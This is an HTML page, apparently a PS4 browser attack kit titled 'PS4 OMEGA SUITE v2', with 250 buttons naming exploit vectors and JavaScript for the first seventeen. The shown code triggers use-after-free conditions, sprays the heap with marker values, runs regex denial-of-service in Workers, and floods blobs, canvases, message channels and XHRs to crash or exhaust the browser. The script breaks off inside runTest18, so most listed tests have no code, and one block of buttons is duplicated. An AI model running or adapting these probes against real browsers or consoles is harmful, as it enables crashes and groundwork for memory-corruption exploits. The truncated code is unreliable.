<!DOCTYPE html>
<html>
<head>
<title>PS4 OMEGA SUITE v2</title>
</head>
<body>

<h1>PS4 OMEGA / 1200.ELF ANALYZER</h1>
<hr>

<h3>USERLAND VECTORS</h3>
<button onclick="runTest01()">01. DOM TREE UAF</button>
<button onclick="runTest02()">02. TEXTDECODER OVF</button>
<button onclick="runTest03()">03. PROXY RECURSION</button>
<button onclick="runTest04()">04. SVG TYPE CONF</button>
<button onclick="runTest05()">05. ARRAY SORT SIDE</button>
<button onclick="runTest06()">06. HEAP SPRAY</button>
<button onclick="runTest07()">07. IPC STORM</button>
<button onclick="runTest08()">08. REGEX DOS</button>
<button onclick="runTest09()">09. BLOB FLOOD</button>
<button onclick="runTest10()">10. GPU TEXTURE OOM</button>
<button onclick="runTest11()">11. XHR SYNC RACE</button>
<button onclick="runTest12()">12. JSON DEEP PARSE</button>
<button onclick="runTest13()">13. INTL LOCALE CRASH</button>
<button onclick="runTest14()">14. RANGE DETACH UAF</button>
<button onclick="runTest15()">15. EVENT DISPATCH FLOOD</button>
<button onclick="runTest16()">16. FILEREADER LEAK</button>
<button onclick="runTest17()">17. BUFFER ALIASING</button>
<button onclick="runTest18()">18. HISTORY STATE OOM</button>
<button onclick="runTest19()">19. STORAGE QUOTA DOS</button>
<button onclick="runTest20()">20. IFRAME CHURN PANIC</button>
<button onclick="runTest21()">21. SELECTION API UAF</button>
<button onclick="runTest22()">22. MAP ITERATOR INVALIDATION</button>
<button onclick="runTest23()">23. ROPE STRING FLATTEN</button>
<button onclick="runTest24()">24. AUDIO TRACK LIST RACE</button>
<button onclick="runTest25()">25. HTMLCOLLECTION NAMED ITEM</button>
<button onclick="runTest26()">26. TIMER HEAP FLOOD</button>
<button onclick="runTest27()">27. CANVAS PATH VERTEX OOM</button>
<button onclick="runTest28()">28. COOKIE BUFFER OVERFLOW</button>
<button onclick="runTest29()">29. ATTRIBUTE NODE EXHAUSTION</button>
<button onclick="runTest30()">30. NULL IMG SRC SOCKET LEAK</button>
<button onclick="runTest31()">31. XSLT TRANSFORM RECURSION</button>
<button onclick="runTest32()">32. MUTATION OBSERVER LOOP</button>
<button onclick="runTest33()">33. CROSS-DOC NODE ADOPTION</button>
<button onclick="runTest34()">34. CSS CALC DEPTH CRASH</button>
<button onclick="runTest35()">35. REGEX CACHE POISONING</button>
<button onclick="runTest36()">36. PROTOTYPE CHAIN BOMB</button>
<button onclick="runTest37()">37. HUGE STRING JOIN OOM</button>
<button onclick="runTest38()">38. UNALIGNED DATAVIEW STRESS</button>
<button onclick="runTest39()">39. EVENT LISTENER EXHAUSTION</button>
<button onclick="runTest40()">40. NULL OBJECT PROPERTY SPRAY</button>
<button onclick="runTest41()">41. FONTFACE SET ITERATOR UAF</button>
<button onclick="runTest42()">42. WORKER TRANSFERABLE RACE</button>
<button onclick="runTest43()">43. NODEITERATOR DETACH</button>
<button onclick="runTest44()">44. ARRAY SPLICE PROXY TRAP</button>
<button onclick="runTest45()">45. TEXTTRACK CUE INVALIDATION</button>
<button onclick="runTest46()">46. SYNC XHR THREAD LOCK</button>
<button onclick="runTest47()">47. HISTORY STATE FLOOD</button>
<button onclick="runTest48()">48. STORAGE I/O THRASHING</button>
<button onclick="runTest49()">49. RECURSIVE IFRAME STACK</button>
<button onclick="runTest50()">50. URL OBJECT HANDLE LEAK</button>
<button onclick="runTest51()">51. DOCUMENT WRITE RE-ENTRANCY</button>
<button onclick="runTest52()">52. DOM ADOPT NODE GETTER POISON</button>
<button onclick="runTest53()">53. REGEX REPLACE STRING MUTATION</button>
<button onclick="runTest54()">54. PROTOTYPE HIJACK SPRAY</button>
<button onclick="runTest55()">55. CSS RULE INSERT RACE</button>
<button onclick="runTest56()">56. XHR FILE DESCRIPTOR LEAK</button>
<button onclick="runTest57()">57. RECURSIVE BLOB EXPANSION</button>
<button onclick="runTest58()">58. WINDOW NAME HUGE ALLOC</button>
<button onclick="runTest59()">59. HEAP PRIMING FRAGMENTATION</button>
<button onclick="runTest60()">60. IFRAME SRCDOC THREAD BOMB</button>
<button onclick="runTest61()">61. DATAVIEW DETACH RACE</button>
<button onclick="runTest62()">62. PROMISE REJECTION FLOOD</button>
<button onclick="runTest63()">63. OBJECT DEFINE PROPERTY LOOP</button>
<button onclick="runTest64()">64. CANVAS PATTERN RECURSION</button>
<button onclick="runTest65()">65. FILTER FUNCTION CONTEXT SWAP</button>
<button onclick="runTest66()">66. HUGE ARRAYBUFFER MAP FAIL</button>
<button onclick="runTest67()">67. IFRAME RELOAD STORM</button>
<button onclick="runTest68()">68. NOTIFICATION API DOS</button>
<button onclick="runTest69()">69. GPU SHADER COMPILER HANG</button>
<button onclick="runTest70()">70. WEBSQL TRANSACTION LOCK</button>
<button onclick="runTest71()">71. ARRAY CONSTRUCTOR POISON</button>
<button onclick="runTest72()">72. FUNCTION BIND RECURSION</button>
<button onclick="runTest73()">73. JSON CYCLIC STRINGIFY</button>
<button onclick="runTest74()">74. ACCESSOR PROPERTY STACK</button>
<button onclick="runTest75()">75. WEBKIT URL PARSER OVERFLOW</button>
<button onclick="runTest76()">76. CANVAS PIXEL MANIPULATION</button>
<button onclick="runTest77()">77. TEXT ENCODER MEMORY SPIKE</button>
<button onclick="runTest78()">78. DOM ELEMENT DEEP CLONE</button>
<button onclick="runTest79()">79. HUGE SCROLL EVENT FLOOD</button>
<button onclick="runTest80()">80. IFRAME SANDBOX VIOLATION</button>
<button onclick="runTest81()">81. DOM TOKEN LIST TOGGLE RACE</button>
<button onclick="runTest82()">82. WEAKMAP GC THRASHING</button>
<button onclick="runTest83()">83. TEXT NODE SPLIT NORMALIZE</button>
<button onclick="runTest84()">84. PROPERTY HASH COLLISION</button>
<button onclick="runTest85()">85. FORM DATA MULTIPART FLOOD</button>
<button onclick="runTest86()">86. WORKER THREAD BOMB</button>
<button onclick="runTest87()">87. SYNC FILE READ LOCK</button>
<button onclick="runTest88()">88. TABLE LAYOUT RECALC OOM</button>
<button onclick="runTest89()">89. MATH POW WATCHDOG KILL</button>
<button onclick="runTest90()">90. HUGE URL SEARCH PARAMS</button>
<button onclick="runTest91()">91. TREEWALKER FILTER UAF</button>
<button onclick="runTest92()">92. ARRAY CONCAT SPREAD POISON</button>
<button onclick="runTest93()">93. REGEX LASTINDEX OVERFLOW</button>
<button onclick="runTest94()">94. TEXTAREA LAYOUT THRASHING</button>
<button onclick="runTest95()">95. FONTFACE RECURSIVE LOAD</button>
<button onclick="runTest96()">96. LOCAL PORT MBUF EXHAUSTION</button>
<button onclick="runTest97()">97. BLOB URL REVOCATION RACE</button>
<button onclick="runTest98()">98. IFRAME NESTING DEPTH KILL</button>
<button onclick="runTest99()">99. CANVAS GRADIENT MEM LEAK</button>
<button onclick="runTest100()">100. THE OMEGA COMBO (ALL-IN)</button>
<button onclick="runTest101()">101. ATTRIBUTE NODE SETNAMEDITEM RACE</button>
<button onclick="runTest102()">102. EVENT LISTENER REMOVE-ADD LOOP</button>
<button onclick="runTest103()">103. CANVAS GETCONTEXT TYPE FLIP</button>
<button onclick="runTest104()">104. XMLSERIALIZER RECURSIVE BOMB</button>
<button onclick="runTest105()">105. OBJECT GETOWNPROPERTYDESCRIPTOR STRESS</button>
<button onclick="runTest106()">106. IFRAME SRC BLOB RECURSION</button>
<button onclick="runTest107()">107. XHR ABORT RACE CONDITION</button>
<button onclick="runTest108()">108. FILE READER SYNC FREEZE</button>
<button onclick="runTest109()">109. HUGE MATH RANDOM BUFFER</button>
<button onclick="runTest110()">110. DOM IMPLEMENTATION CREATE DOC FLOOD</button>
<button onclick="runTest111()">111. ARRAY BUFFER NEUTERING RACE</button>
<button onclick="runTest112()">112. PROTOTYPE POLLUTION CHAIN</button>
<button onclick="runTest113()">113. EVENT DISPATCH RECURSIVE TRAP</button>
<button onclick="runTest114()">114. DOM STRING MAP PROPERTY FLOOD</button>
<button onclick="runTest115()">115. SELECTION EXTEND CRASH</button>
<button onclick="runTest116()">116. CANVAS 2D PATH EXPLOSION</button>
<button onclick="runTest117()">117. XHR SYNC BLOB LEAK</button>
<button onclick="runTest118()">118. LOCALSTORAGE QUOTA THRASHER</button>
<button onclick="runTest119()">119. NESTED WORKER BOMBER</button>
<button onclick="runTest120()">120. IFRAME HISTORY STATE DOS</button>
<button onclick="runTest121()">121. MESSAGE PORT TRANSFER RACE</button>
<button onclick="runTest122()">122. DOM PARSER RECURSIVE ENTITY</button>
<button onclick="runTest123()">123. FORM VALIDATION BUBBLE TRAP</button>
<button onclick="runTest124()">124. SELECTION RANGE COLLAPSE LOOP</button>
<button onclick="runTest125()">125. TEXT NODE DATA REPLACE OVERFLOW</button>
<button onclick="runTest126()">126. SETTIMEOUT HEAP FLOOD</button>
<button onclick="runTest127()">127. XHR RESPONSE TEXT OOM</button>
<button onclick="runTest128()">128. CANVAS PUTIMAGEDATA ALIGN FAIL</button>
<button onclick="runTest129()">129. BLOB SLICE RECURSION DEPTH</button>
<button onclick="runTest130()">130. IFRAME RELOAD MEMORY LEAK</button>
<button onclick="runTest131()">131. HISTORY STATE CYCLIC BOMB</button>
<button onclick="runTest132()">132. MESSAGE CHANNEL PORT CLONE LOOP</button>
<button onclick="runTest133()">133. NODE FILTER RE-ENTRANCY TRAP</button>
<button onclick="runTest134()">134. DOM IMPLEMENTATION PROTOTYPE SPRAY</button>
<button onclick="runTest135()">135. TEXT ENCODER STREAM FRAGMENTATION</button>
<button onclick="runTest136()">136. FETCH API KEEP-ALIVE FLOOD</button>
<button onclick="runTest137()">137. BLOB SLICE MEMORY MAPPING FAIL</button>
<button onclick="runTest138()">138. SYNC XHR RECURSIVE OPEN</button>
<button onclick="runTest139()">139. WORKER IMPORT SCRIPTS DOS</button>
<button onclick="runTest140()">140. IFRAME SRC JAVASCRIPT URI LOOP</button>
<button onclick="runTest141()">141. CUSTOM ELEMENT UPGRADE RACE</button>
<button onclick="runTest142()">142. READABLE STREAM TEARING</button>
<button onclick="runTest143()">143. SHADOW DOM EVENT RETARGETING</button>
<button onclick="runTest144()">144. PROXY REVOKE DURING ITERATION</button>
<button onclick="runTest145()">145. HTML OPTION COLLECTION SETTER</button>
<button onclick="runTest146()">146. FILE READER SYNC BLOB FLOOD</button>
<button onclick="runTest147()">147. HUGE HEADER XHR ATTACK</button>
<button onclick="runTest148()">148. RECURSIVE BLOB CONSTRUCTION</button>
<button onclick="runTest149()">149. LOOPBACK SOCKET CONNECT STORM</button>
<button onclick="runTest150()">150. DOM STORAGE TRANSACTION LOCK</button>
<button onclick="runTest141()">141. CUSTOM ELEMENT UPGRADE RACE</button>
<button onclick="runTest142()">142. READABLE STREAM TEARING</button>
<button onclick="runTest143()">143. SHADOW DOM EVENT RETARGETING</button>
<button onclick="runTest144()">144. PROXY REVOKE DURING ITERATION</button>
<button onclick="runTest145()">145. HTML OPTION COLLECTION SETTER</button>
<button onclick="runTest146()">146. FILE READER SYNC BLOB FLOOD</button>
<button onclick="runTest147()">147. HUGE HEADER XHR ATTACK</button>
<button onclick="runTest148()">148. RECURSIVE BLOB CONSTRUCTION</button>
<button onclick="runTest149()">149. LOOPBACK SOCKET CONNECT STORM</button>
<button onclick="runTest150()">150. DOM STORAGE TRANSACTION LOCK</button>
<button onclick="runTest151()">151. FULLSCREEN TOGGLE RACE</button>
<button onclick="runTest152()">152. DETACHED NODE FS REQUEST</button>
<button onclick="runTest153()">153. IFRAME FS REMOVAL TRAP</button>
<button onclick="runTest154()">154. VIDEO SOURCE SWAP PANIC</button>
<button onclick="runTest155()">155. PSEUDO-CLASS LAYOUT THRASH</button>
<button onclick="runTest156()">156. FS Z-INDEX LAYER EXPLOSION</button>
<button onclick="runTest157()">157. POPUP BLOCKER UI LOCK</button>
<button onclick="runTest158()">158. FULLSCREEN CANVAS OOM</button>
<button onclick="runTest159()">159. SCREEN ORIENTATION LOCK DOS</button>
<button onclick="runTest160()">160. THE BLACKOUT (CTX SWITCH)</button>
<button onclick="runTest161()">161. POINTER LOCK RACE CONDITION</button>
<button onclick="runTest162()">162. CANVAS CONTEXT LOSS FLOOD</button>
<button onclick="runTest163()">163. SVG FILTER STACK OVERFLOW</button>
<button onclick="runTest164()">164. MIX-BLEND-MODE COMPOSITE KILL</button>
<button onclick="runTest165()">165. CSS 3D TRANSFORM MATRIX BOMB</button>
<button onclick="runTest166()">166. ADOPT NODE CROSS-DOC FS</button>
<button onclick="runTest167()">167. VIDEO POSTER SWAP FLICKER</button>
<button onclick="runTest168()">168. IFRAME SANDBOX FLAG MUTATION</button>
<button onclick="runTest169()">169. ANIMATION FRAME RECURSION</button>
<button onclick="runTest170()">170. MULTI-ELEMENT FS TOGGLE</button>
<button onclick="runTest171()">171. VIDEO TRACK CUE RESIZE BOMB</button>
<button onclick="runTest172()">172. CANVAS READPIXELS SYNC LOCK</button>
<button onclick="runTest173()">173. OBJECT TAG FALLBACK SWITCH</button>
<button onclick="runTest174()">174. CSS CLIP-PATH GEOMETRY TRAP</button>
<button onclick="runTest175()">175. IFRAME RECURSIVE FS REQUEST</button>
<button onclick="runTest176()">176. DEEP CLONE NODE APPEND RACE</button>
<button onclick="runTest177()">177. SELECTION RANGE CROSS-BOUNDARY</button>
<button onclick="runTest178()">178. TABLE BORDER COLLAPSE RECALC</button>
<button onclick="runTest179()">179. SCROLL INTO VIEW INTERRUPT</button>
<button onclick="runTest180()">180. DISPLAY NONE LAYOUT FLUSH</button>
<button onclick="runTest181()">181. FULLSCREEN + HISTORY STATE FLOOD</button>
<button onclick="runTest182()">182. WORKER + MESSAGE CHANNEL PORT UAF</button>
<button onclick="runTest183()">183. WORKER + BUFFER TRANSFER + GC RACE</button>
<button onclick="runTest184()">184. VIDEO + FULLSCREEN + DOM REMOVAL</button>
<button onclick="runTest185()">185. TYPEDARRAY + WORKER TERMINATE RACE</button>
<button onclick="runTest186()">186. HISTORY + GC + IFRAME NAVIGATION</button>
<button onclick="runTest187()">187. WORKER + TEXTENCODER FRAGMENTATION</button>
<button onclick="runTest188()">188. CANVAS RESIZE + FULLSCREEN TOGGLE</button>
<button onclick="runTest189()">189. NESTED WORKER + TRANSFER CHAIN KILL</button>
<button onclick="runTest190()">190. MEDIA + HISTORY + FULLSCREEN COMBO</button>
<button onclick="runTest191()">191. WORKER MESSAGE LOOPBACK UAF</button>
<button onclick="runTest192()">192. TYPEDARRAY TRANSFER NEUTER RACE</button>
<button onclick="runTest193()">193. SHARED BLOB URL THREAD KILL</button>
<button onclick="runTest194()">194. WORKER GARBAGE STORM POSTMESSAGE</button>
<button onclick="runTest195()">195. MESSAGE PORT CLONE DEATH</button>
<button onclick="runTest196()">196. FULLSCREEN HISTORY BACK FLOOD</button>
<button onclick="runTest197()">197. VIDEO FULLSCREEN DETACH PANIC</button>
<button onclick="runTest198()">198. CANVAS CONTEXT LOSS FS TOGGLE</button>
<button onclick="runTest199()">199. AUDIO CONTEXT VISUALIZER CRASH</button>
<button onclick="runTest200()">200. THE VOID (STATE DESYNC)</button>
<button onclick="runTest201()">201. WORKER TERMINATE BUFFER UAF</button>
<button onclick="runTest202()">202. NESTED WORKER TRANSFER CHAIN</button>
<button onclick="runTest203()">203. SHARED BLOB URL REVOKE STORM</button>
<button onclick="runTest204()">204. MESSAGE PORT DOUBLE TRANSFER</button>
<button onclick="runTest205()">205. WORKER GC FLOOD GATE</button>
<button onclick="runTest206()">206. FULLSCREEN HISTORY BACK FLIP</button>
<button onclick="runTest207()">207. VIDEO DETACH FULLSCREEN ZOMBIE</button>
<button onclick="runTest208()">208. CANVAS CONTEXT LOSS FS RESIZE</button>
<button onclick="runTest209()">209. HISTORY STATE GETTER POISON</button>
<button onclick="runTest210()">210. IFRAME NAV FULLSCREEN LOCK</button>
<button onclick="runTest211()">211. WORKER NEUTERED BUFFER ACCESS</button>
<button onclick="runTest212()">212. MESSAGE PORT ENTANGLEMENT KILL</button>
<button onclick="runTest213()">213. WORKER SELF-CLOSE POSTMESSAGE FLOOD</button>
<button onclick="runTest214()">214. SHARED ARRAY BUFFER ATOMIC WAIT (SIM)</button>
<button onclick="runTest215()">215. BLOB URL WORKER REVOCATION RACE</button>
<button onclick="runTest216()">216. FULLSCREEN IFRAME HISTORY NAV</button>
<button onclick="runTest217()">217. VIDEO FS TRACK SWITCH CRASH</button>
<button onclick="runTest218()">218. CANVAS FS CONTEXT LOSS LOOP</button>
<button onclick="runTest219()">219. HISTORY STATE GC PRESSURE COOKER</button>
<button onclick="runTest220()">220. THE CLUSTER BOMB (ALL VECTORS)</button>
<button onclick="runTest221()">221. MESSAGE PORT TRANSFER ZOMBIE</button>
<button onclick="runTest222()">222. WORKER TERMINATE BUFFER RECLAIM</button>
<button onclick="runTest223()">223. RECURSIVE POSTMESSAGE FLOOD LOOP</button>
<button onclick="runTest224()">224. SHARED BLOB URL THREAD COLLISION</button>
<button onclick="runTest225()">225. WORKER IMPORT SCRIPT GC RACE</button>
<button onclick="runTest226()">226. IFRAME FULLSCREEN DETACH BOMB</button>
<button onclick="runTest227()">227. HISTORY STATE SERIALIZATION TRAP</button>
<button onclick="runTest228()">228. VIDEO SOURCE SWAP FS PANIC</button>
<button onclick="runTest229()">229. CANVAS PROXY CONTEXT LOSS</button>
<button onclick="runTest230()">230. THE EVENT HORIZON (ALL VECTORS)</button>
<button onclick="runTest231()">231. WORKER PORT ENTANGLEMENT LOOP</button>
<button onclick="runTest232()">232. TYPEDARRAY TRANSFER RECLAIM RACE</button>
<button onclick="runTest233()">233. WORKER IMPORT CHAIN TERMINATION</button>
<button onclick="runTest234()">234. MESSAGE CHANNEL GARBAGE STORM</button>
<button onclick="runTest235()">235. SHARED BLOB URL FETCH RACE</button>
<button onclick="runTest236()">236. FULLSCREEN HISTORY PUSH FLOOD</button>
<button onclick="runTest237()">237. MEDIA ELEMENT ORPHAN FULLSCREEN</button>
<button onclick="runTest238()">238. CANVAS RENDER TARGET SWITCH</button>
<button onclick="runTest239()">239. NESTED IFRAME HISTORY LOCK</button>
<button onclick="runTest240()">240. THE OMEGA DESYNC (ALL VECTORS)</button>
<button onclick="runTest241()">241. WORKER TERMINATE DURING TRANSFER</button>
<button onclick="runTest242()">242. SHARED ARRAY BUFFER ATOMIC TEAR</button>
<button onclick="runTest243()">243. MESSAGE PORT TRANSFER FLOOD UAF</button>
<button onclick="runTest244()">244. BLOB URL REVOCATION THREAD RACE</button>
<button onclick="runTest245()">245. NESTED WORKER CLOSE CHAIN REACTION</button>
<button onclick="runTest246()">246. FULLSCREEN VIDEO SRC SWAP PANIC</button>
<button onclick="runTest247()">247. HISTORY STATE GETTER GC TRIGGER</button>
<button onclick="runTest248()">248. IFRAME NAV FULLSCREEN LOCKOUT</button>
<button onclick="runTest249()">249. CANVAS CONTEXT LOSS RESIZE LOOP</button>
<button onclick="runTest250()">250. THE SINGULARITY (ALL-IN-ONE)</button>


<hr>
<h3>SYSTEM LOG</h3>
<div id="logger" style="border:1px solid #000; width:95%; height:300px; overflow:scroll; font-family:monospace;">
    [READY] Sistema aguardando injeção de vetores...
</div>

<script>
function log(msg) {
    var l = document.getElementById('logger');
    var d = new Date();
    var time = d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds() + "." + d.getMilliseconds();
    l.innerHTML = "[" + time + "] " + msg + "<br>" + l.innerHTML;
}

function runTest01() {
    log("Iniciando Teste 01 (DOM UAF)...");
    var root = document.createElement('div');
    var nodes = [];
    var trash = [];
    document.body.appendChild(root);
    for(var i=0; i<400; i++) {
        var el = document.createElement('div');
        el.id = 'n' + i;
        var s = document.createElement('span');
        s.textContent = "A".repeat(255); 
        el.appendChild(s);
        root.appendChild(el);
        nodes.push(el);
    }
    function walker() {
        var range = document.createRange();
        range.selectNodeContents(root);
        range.deleteContents(); 
        for(var j=0; j<150; j++) {
            if(nodes[j]) {
                trash.push(nodes[j]);
                nodes[j] = null;
                try { 
                    var x = trash[trash.length-1].firstChild.textContent;
                    var y = trash[trash.length-1].nextSibling;
                } catch(e){}
            }
        }
    }
    root.addEventListener('DOMNodeRemoved', function() {
        walker();
        var heavy = new Uint32Array(0x2000).fill(0x41414141);
        var spray = [];
        for(let k=0; k<100; k++) spray.push(new ArrayBuffer(64));
    });
    document.body.removeChild(root);
    log(">> T01 Concluído: Vetor DOM executado. Verifique estabilidade.");
}

function runTest02() {
    log("Iniciando Teste 02 (TextDecoder)...");
    var decoder = new TextDecoder('utf-8', {fatal: false});
    var spray = [];
    var buffer = new Uint8Array(1024 * 1024 * 4); 
    for(var i=0; i<buffer.length; i++) buffer[i] = (i % 2 === 0) ? 0xC0 : 0x80;
    
    try {
        for(var k=0; k<100; k++) {
            var chunk = buffer.subarray(k * 2000, (k+1) * 2000);
            var str = decoder.decode(chunk, {stream: true});
            spray.push(str + "X".repeat(0xFF)); 
            if(k % 20 === 0) { spray = []; }
        }
        var massive = decoder.decode(buffer); 
        log(">> T02 Sucesso: Decoded Len: " + massive.length);
    } catch(e) {
        log(">> T02 Falha: " + e.message);
    }
}

function runTest03() {
    log("Iniciando Teste 03 (Proxy Recursion)...");
    var target = {};
    var p = new Proxy(target, {
        get: function(obj, prop) {
            if (prop === 'xyz') return 1;
            var junk = {a: 1, b: "B".repeat(128), c: new Uint8Array(32)};
            return obj[prop] + p[prop]; 
        }
    });
    try {
        Object.prototype.temp = p;
        var r = p.anyProp; 
    } catch(e) {
        var arr = [];
        for(var i=0; i<20000; i++) arr.push({x: p, y: new Uint32Array(16)});
        log(">> T03 Concluído: Stack Depth Limit Atingido.");
    }
}

function runTest04() {
    log("Iniciando Teste 04 (SVG Type Conf)...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var path = document.createElementNS("http://www.w3.org/2000/svg", "path");
    svg.appendChild(path);
    document.body.appendChild(svg);
    var list = [];
    for(var i=0; i<0x400; i++) {
        var o = { 
            toString: function() { 
                path.parentNode.removeChild(path); 
                var fill = new Array(100).fill(1.1);
                return "M10 10"; 
            } 
        };
        list.push(o);
    }
    try {
        path.setAttribute("d", list[100]);
        var point = svg.createSVGPoint();
        point.matrixTransform(svg.getScreenCTM());
    } catch(e) {}
    log(">> T04 Concluído: SVG Casting forçado.");
}

function runTest05() {
    log("Iniciando Teste 05 (Array Sort)...");
    var arr = new Array(4000);
    for(var i=0; i<arr.length; i++) arr[i] = i;
    arr[0] = 1.1;
    arr.sort(function(a, b) {
        if (a === 200) {
            arr.length = 1; 
            var spray = [];
            for(var k=0; k<10000; k++) spray.push(new Uint32Array(64).fill(0x13371337));
            return 0;
        }
        return a - b;
    });
    log(">> T05 Concluído: Array length pós-sort: " + arr.length);
}

function runTest06() {
    log("Iniciando Teste 06 (Kernel Heap Spray)...");
    var ab = new ArrayBuffer(0x20000); 
    var u32 = new Uint32Array(ab);
    var targetArrays = [];
    for(var i=0; i<8000; i++) {
        var size = (i % 4 === 0) ? 0x200 : 0x8000; 
        targetArrays.push(new Uint8Array(size));
        targetArrays[i].fill(0x41);
    }
    for(var i=0; i<targetArrays.length; i+=2) {
        targetArrays[i] = null;
    }
    var fillers = [];
    for(var j=0; j<4000; j++) {
        var f = new Float64Array(32); 
        f[0] = 1.61803398875e-300; 
        fillers.push(f);
    }
    log(">> T06 Concluído: Memória fragmentada e preenchida.");
}

function runTest07() {
    log("Iniciando Teste 07 (IPC Storm)...");
    var ports = [];
    var channelCount = 0;
    function sprayIPC() {
        try {
            for(var i=0; i<1000; i++) {
                var mc = new MessageChannel();
                ports.push(mc.port1);
                mc.port2.postMessage("ping", [mc.port2]); 
                channelCount++;
            }
            if(channelCount < 25000) {
                setTimeout(sprayIPC, 5);
            } else {
                for(var p of ports) p.close();
                log(">> T07 Concluído: Handles esgotados e fechados.");
            }
        } catch(e) { log(">> T07 Erro: " + e); }
    }
    sprayIPC();
}

function runTest08() {
    log("Iniciando Teste 08 (Regex DoS)...");
    var pattern = "((a*)+)+b"; 
    var str = "a".repeat(5000); 
    var blob = new Blob(["onmessage=function(e){ var r = new RegExp('((a*)+)+b'); r.exec(e.data); }"], {type: "application/javascript"});
    for(var i=0; i<12; i++) { 
        var w = new Worker(URL.createObjectURL(blob));
        w.postMessage(str);
    }
    log(">> T08 Enviado: 12 Workers lançados (Possível Freeze).");
}

function runTest09() {
    log("Iniciando Teste 09 (Blob Flood)...");
    var urls = [];
    var data = new Uint8Array(1024*1024*2).fill(0x90); 
    var loop = setInterval(function() {
        for(var i=0; i<100; i++) {
            var b = new Blob([data], {type: "application/octet-stream"});
            var u = URL.createObjectURL(b);
            urls.push(u);
            if(urls.length > 3000) {
                URL.revokeObjectURL(urls.shift());
                var junk = new Array(2000).join('x');
            }
        }
        if(urls.length % 1000 == 0) log(".. URLs ativas: " + urls.length);
        
        if(urls.length > 50000) {
            clearInterval(loop);
            log(">> T09 Concluído: Flood finalizado.");
        }
    }, 20);
}

function runTest10() {
    log("Iniciando Teste 10 (GPU OOM)...");
    var canvases = [];
    try {
        for(var i=0; i<1000; i++) {
            var c = document.createElement('canvas');
            c.width = 4096 - (i % 100); 
            c.height = 2048 + (i % 100);
            var ctx = c.getContext('2d');
            if(ctx) {
                var imgData = ctx.createImageData(200, 200);
                for(var j=0; j<imgData.data.length; j+=4) imgData.data[j] = 255;
                ctx.putImageData(imgData, 0, 0);
                canvases.push(c);
            }
        }
    } catch(e) {
        canvases = null;
        log(">> T10 Critical: GPU OOM Triggered.");
    }
    if(canvases) log(">> T10 Info: Alocados " + canvases.length + " canvases.");
}
function runTest11() {
    log("Iniciando T11: XHR Sync Race...");
    var pool = [];
    var running = true;
    try {
        for(var i=0; i<50; i++) {
            var x = new XMLHttpRequest();
            pool.push(x);
            x.onreadystatechange = function() {
                if(this.readyState == 4 && running) {
                    var s = document.createElement('script');
                    s.textContent = 'var ' + 'v'.repeat(100) + ' = ' + Date.now();
                    document.body.appendChild(s);
                    document.body.removeChild(s);
                    this.open("GET", window.location.href, false);
                    try { this.send(); } catch(e){}
                }
            };
        }
        pool.forEach(function(xhr) {
            xhr.open("GET", "/", true);
            xhr.send();
        });
        setTimeout(function(){ running = false; log(">> T11: XHR Loop Parado"); }, 3000);
    } catch(e) { log(">> T11 Erro: " + e.message); }
}

function runTest12() {
    log("Iniciando T12: JSON Deep Nesting...");
    var depth = 8000;
    var jsonStr = '{"a":';
    for(var i=0; i<depth; i++) jsonStr += '{"b":';
    jsonStr += '1';
    for(var i=0; i<depth; i++) jsonStr += '}';
    jsonStr += '}';
    try {
        var t0 = performance.now();
        var obj = JSON.parse(jsonStr);
        var spray = new Array(1000).fill(obj);
        log(">> T12: Parse OK (" + (performance.now()-t0).toFixed(2) + "ms). Objects created.");
    } catch(e) {
        var junk = new Uint32Array(0x10000);
        junk.fill(0xDEADBEEF);
        log(">> T12 Exception (Stack Overflow?): " + e.message);
    }
}

function runTest13() {
    log("Iniciando T13: Intl Locale Stress...");
    var locales = ['en-US', 'ar-SA', 'zh-CN', 'ja-JP', 'ru-RU', 'th-TH'];
    var storage = [];
    try {
        for(var i=0; i<2000; i++) {
            var loc = locales[i % locales.length];
            var opt = { 
                style: 'currency', 
                currency: 'USD', 
                currencyDisplay: i % 2 == 0 ? 'symbol' : 'name',
                maximumSignificantDigits: 20
            };
            var nf = new Intl.NumberFormat(loc, opt);
            var res = nf.format(123456.789);
            if(i % 50 === 0) {
                storage.push({formatter: nf, result: res + "A".repeat(255)});
            }
        }
        log(">> T13: Intl Objects: " + storage.length);
    } catch(e) { log(">> T13 Erro: " + e); }
}

function runTest14() {
    log("Iniciando T14: Range Detach UAF...");
    var p = document.createElement('p');
    p.innerHTML = "<b>bold</b><span>text</span><i>italic</i>";
    document.body.appendChild(p);
    var r = document.createRange();
    r.setStart(p.firstChild, 0);
    r.setEnd(p.lastChild, 1);
    var iterations = 0;
    
    var i = setInterval(function() {
        iterations++;
        r.deleteContents();
        p.innerHTML = "<b>R" + iterations + "</b>";
        r.setStart(p.firstChild, 0);
        var f = document.createDocumentFragment();
        f.appendChild(document.createElement('div'));
        r.insertNode(f);
        
        if(iterations > 500) {
            clearInterval(i);
            document.body.removeChild(p);
            log(">> T14: Range manipulation concluída.");
        }
    }, 5);
}

function runTest15() {
    log("Iniciando T15: Event Dispatch Flood...");
    var target = document.createElement('div');
    var count = 0;
    var handler = function(e) {
        count++;
        if(count % 100 === 0) {
            var heavy = new Uint8Array(0x1000).fill(count);
        }
        if(count < 5000) {
            target.dispatchEvent(new Event('customevent'));
        }
    };
    target.addEventListener('customevent', handler);
    try {
        target.dispatchEvent(new Event('customevent'));
        log(">> T15: Events dispatched: " + count);
    } catch(e) {
        log(">> T15 Stack Limit: " + e.message);
    }
}

function runTest16() {
    log("Iniciando T16: FileReader Resource Leak...");
    var readers = [];
    var blobData = new Uint8Array(1024*50).fill(65);
    var blob = new Blob([blobData]);
    
    var interval = setInterval(function() {
        for(var i=0; i<20; i++) {
            var fr = new FileReader();
            fr.readAsDataURL(blob);
            readers.push(fr);
        }
        if(readers.length > 2000) {
            // Não limpamos o array intencionalmente para segurar handles
            log(">> T16: Active Readers: " + readers.length + " (Leaking handles)");
            if(readers.length > 8000) clearInterval(interval);
        }
    }, 50);
}

function runTest17() {
    log("Iniciando T17: Buffer Aliasing...");
    var ab = new ArrayBuffer(0x100000); 
    var view1 = new Uint8Array(ab);
    var view2 = new Float64Array(ab);
    var view3 = new DataView(ab);
    
    try {
        for(var i=0; i<view2.length; i++) {
            view2[i] = 1.23456789e+100; 
            if(i % 1000 === 0) {
                var check = view3.getUint8(i*8);
                view1[i*8] = check ^ 0xFF; 
            }
        }
        var complex = [];
        for(var k=0; k<1000; k++) complex.push(ab.slice(k*100, (k+1)*100));
        log(">> T17: Buffer manipulado via múltiplas views.");
    } catch(e) { log(">> T17 Erro: " + e); }
}

function runTest18() {
